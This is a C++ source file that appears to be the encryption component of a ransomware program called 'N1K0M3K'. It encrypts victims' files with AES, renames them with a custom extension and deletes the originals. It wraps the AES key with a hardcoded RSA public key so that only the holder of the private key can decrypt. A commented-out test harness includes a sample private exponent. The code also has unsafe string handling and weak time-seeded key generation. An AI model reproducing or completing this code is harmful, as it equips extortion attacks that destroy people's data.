#include "config.h"
#include "Crypter.h"
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <sstream>
#include <cryptopp/modes.h>
#include <cryptopp/base64.h>
#include <cryptopp/aes.h>
#include <cryptopp/hex.h>
#include <cryptopp/files.h>
#include <cryptopp/default.h>
#include <cryptopp/randpool.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>

#ifdef LINUX
	#include <sys/stat.h>
	#include <sys/types.h>
#endif

	using namespace std;
	Crypter::Crypter(){
		
#ifdef LINUX
		this->fileDelim='/';
#else
		this->fileDelim='\\';
#endif
	}
	void Crypter::encryptFile(char * filename,char *srcPath, char* key){
		char ext[9]=".N1K0M3K";
		char cryptedFilePath[1024];
		char cryptedFileName[1024];
		
	
		strcpy(cryptedFileName,filename);
		strcat(cryptedFileName,ext);
		strcpy(cryptedFilePath,srcPath);
		strcat(cryptedFilePath,getFileName(cryptedFileName));
		cryptedFileName[strlen(filename)+8+1]='\0';
		strcat(cryptedFilePath, ".");
		
		
		CryptoPP::FileSource f(filename, true, new CryptoPP::DefaultEncryptorWithMAC(key, new CryptoPP::FileSink(cryptedFilePath)));
		remove(filename);
		
		
	}

	void Crypter::decryptFile(char * filename,char *srcPath,char* key){
		
		char decryptedFilePath[1024];
		char decryptedFileName[1024];
		strcpy(decryptedFileName,filename);
		decryptedFileName[strlen(filename)-12]='\0';
		strcpy(decryptedFilePath,srcPath);
		//strcat(decryptedFilePath,this->getFileName(decryptedFileName));
		//decryptedFileName[strlen(filename)+1]='\0';
		//TODO FIX DECRYPTED FILENAME WIN
		cout << "decrypt " << filename <<" end"<< endl;
		cout << "result " << decryptedFileName <<" end " << endl ; 
		CryptoPP::FileSource f(filename, true, new CryptoPP::DefaultDecryptorWithMAC(key, new CryptoPP::FileSink(decryptedFileName)));
		cout << "File : "<<decryptedFileName <<" decrypted "<<endl;
	}
	char * Crypter::generateKey(){
		char hex[17]="0123456789ABCDEF";
		char *key=(char*)malloc(64*sizeof(char));
		srand(time(NULL));
		for (int i = 0; i < 64; i++)
		{
			int random=rand()%(16);
			key[i]=hex[random];
		}
	 	return key;
	}



  string Crypter::encryptAesKeyWithPublicKey(string aesKey){

		CryptoPP::Integer n(xn), e(xe);
		CryptoPP::RSA::PublicKey key;
		key.Initialize(n, e);
	  	std::ostringstream out;
	 	CryptoPP::Integer m((const CryptoPP::byte *)aesKey.data(), aesKey.size());
	 	CryptoPP::Integer enc = key.ApplyFunction(m);
	  	out << enc;
		return out.str();
}

	string Crypter::decryptAesKeyWithPrivateKey(string  cryptedAes, char * privateKey){

		CryptoPP::Integer n(xn), e(xe), d(privateKey);
		CryptoPP::RSA::PrivateKey key;
		key.Initialize(n, e,d);
		CryptoPP::AutoSeededRandomPool prng;
		std::string dec;
		CryptoPP::Integer enc(cryptedAes.c_str());
	 	CryptoPP::Integer r = key.CalculateInverse(prng, enc);
	  	dec.resize(r.MinEncodedSize());
	  	r.Encode((CryptoPP::byte *)dec.data(), dec.size());
	  	return dec;
	}


	char* Crypter::getFileName(char *filename){
		char hex[17] = "0123456789ABCDEF";
		char randomExt[4];
		char *result=strrchr( filename, this->fileDelim);
		strncpy(result, result+1, strlen(result));
		randomExt[0] = hex[rand() % 16];
		randomExt[1] = hex[rand() % 16];
		randomExt[2] = hex[rand() % 16];
		randomExt[3] = '\0';
		strcat(result, ".");
		strcat(result, randomExt);
		return result;
	}
	void Crypter::createKeyFile(char *key,char *path){
	strcat(path,&(this->fileDelim));
	strcat(path,key);
	ofstream outfile (path);
	outfile<<key;

	}
// int main(){

// 	Crypter crypter;
// 	char  key[64];
// 	strcpy(key,crypter.generateKey());
// 	string x=crypter.encryptAesKeyWithPublicKey(key);
// 	cout<<"*"<<key<<"*"<<endl;
// 	cout<<"*"<<x<<"*"<<endl;
// 	string y=crypter.decryptAesKeyWithPrivateKey(x,"0xa09e3f68c186acc43b2f1f58b530397554cd730322b8f18e2235babf137d43e2ed0ec23af1487164c786637a6f524e548db0469c29fff6cb5df50f45adc1461f");
// 	cout<<"*"<<y<<"*"<<endl<<"fin";
// 	//crypter.encryptFile("/Users/s-man/Desktop/W7-Familiale-Premium-SP1-64bits.iso","/Users/s-man/Desktop/N1K0M3K_CRYPTED_FILES/",key);
// 	//crypter.decryptFile("/Users/s-man/Desktop/N1K0M3K_CRYPTED_FILES/x.png.N1K0M3K","/Users/s-man/Desktop/N1K0M3K_DECRYPTED_FILES/",key);
	
// }
